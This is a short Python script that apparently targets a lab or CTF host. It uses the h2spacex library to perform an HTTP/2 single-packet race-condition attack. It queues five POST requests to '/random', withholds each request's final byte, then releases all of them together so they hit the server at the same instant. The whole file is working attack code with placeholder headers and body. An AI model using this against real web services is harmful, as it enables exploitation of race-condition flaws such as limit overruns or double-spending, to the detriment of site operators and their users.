from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames

# Initialize the connection with the new hostname and port
h2_conn = H2OnTlsConnection(
    hostname='ece117.bulr.boo',
    port_number=443
)

h2_conn.setup_connection()

# Modify headers and body as needed
headers = """accept: */*
content-type: application/x-www-form-urlencoded
...
"""

body = """BODY
DATA...
...
"""

# Generate stream IDs
stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=5)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte

for s_id in stream_ids_list:

    header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
        method='POST',
        headers_string=headers,
        scheme='https',
        stream_id=s_id,
        authority="ece117.bulr.boo",
        body=body,
        path='/random'  # Update path to target '/random'
    )
    
    all_headers_frames.append(header_frames_without_last_byte)
    all_data_frames.append(last_data_frame_with_last_byte)
    
# Concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
    temp_headers_bytes += bytes(h)

# Concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
    temp_data_bytes += bytes(d)    

# Send header frames
h2_conn.send_frames(temp_headers_bytes)

# Wait some time
sleep(0.1)

# Send ping frame to warm up connection
h2_conn.send_ping_frame()

# Send remaining data frames
h2_conn.send_frames(temp_data_bytes)

# Parse response frames
resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

# Close the connection to stop response parsing and exit the script
h2_conn.close_connection()